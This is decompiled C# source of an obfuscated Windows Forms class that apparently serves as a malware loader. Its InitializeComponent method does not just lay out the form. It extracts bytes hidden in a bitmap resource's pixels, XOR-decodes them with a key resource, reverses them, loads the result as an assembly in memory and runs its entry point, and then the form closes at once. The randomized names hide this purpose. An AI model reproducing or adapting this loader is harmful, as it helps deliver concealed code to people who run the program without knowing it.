using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using apWleInKuECPFJIq.Properties;

namespace apWleInKuECPFJIq;

public class LkflKUZVEGjKPybiaG : Form
{
	private IContainer components = null;

	private string[] BxiLgZcEwgnSLspJU;

	private byte[] vpEVcQLoMbobEE;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(489, 199));
		((Control)this).set_Name("LkflKUZVEGjKPybiaG");
		((Control)this).set_Text("LkflKUZVEGjKPybiaG");
		((Form)this).add_Load((EventHandler)LkflKUZVEGjKPybiaG_Load);
		((Control)this).ResumeLayout(false);
		Bitmap val = (Bitmap)Resources.ResourceManager.GetObject("GqcJYHBnDa");
		byte[] array = LKEdIEhrTB(val);
		Rectangle rectangle = LlluWEXCJkMK(val);
		BitmapData val2 = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
		Marshal.Copy(val2.get_Scan0(), array, 0, array.Length);
		vpEVcQLoMbobEE = new byte[ljXUMcBPQSBllovKK(array)];
		Array.Copy(array, 4, vpEVcQLoMbobEE, 0, vpEVcQLoMbobEE.Length);
		byte[] array2 = (byte[])Resources.ResourceManager.GetObject("HvWtVNsEmseUNO");
		for (int i = 0; i < vpEVcQLoMbobEE.Length; i++)
		{
			for (int j = 0; j < array2.Length; j++)
			{
				vpEVcQLoMbobEE[i] = (byte)(vpEVcQLoMbobEE[i] ^ array2[j]);
			}
		}
		byte[] array3 = new byte[vpEVcQLoMbobEE.Length];
		for (int i = 0; i < array3.Length; i++)
		{
			array3[i] = vpEVcQLoMbobEE[i];
		}
		for (int i = 0; i < array3.Length; i++)
		{
			vpEVcQLoMbobEE[vpEVcQLoMbobEE.Length - i - 1] = array3[i];
		}
		Assembly assembly = Assembly.Load(vpEVcQLoMbobEE);
		assembly.EntryPoint!.Invoke(null, new object[1] { BxiLgZcEwgnSLspJU });
	}

	private int ljXUMcBPQSBllovKK(byte[] POICPEEDpwZTxt)
	{
		return BitConverter.ToInt32(POICPEEDpwZTxt, 0);
	}

	private Rectangle LlluWEXCJkMK(Bitmap POICPEEDpwZTxt)
	{
		return new Rectangle(0, 0, ((Image)POICPEEDpwZTxt).get_Width(), ((Image)POICPEEDpwZTxt).get_Height());
	}

	private byte[] LKEdIEhrTB(Bitmap POICPEEDpwZTxt)
	{
		return new byte[((Image)POICPEEDpwZTxt).get_Width() * ((Image)POICPEEDpwZTxt).get_Height() * 4];
	}

	public LkflKUZVEGjKPybiaG(string[] args)
	{
		BxiLgZcEwgnSLspJU = args;
		Thread.Sleep(0);
		InitializeComponent();
	}

	private void LkflKUZVEGjKPybiaG_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
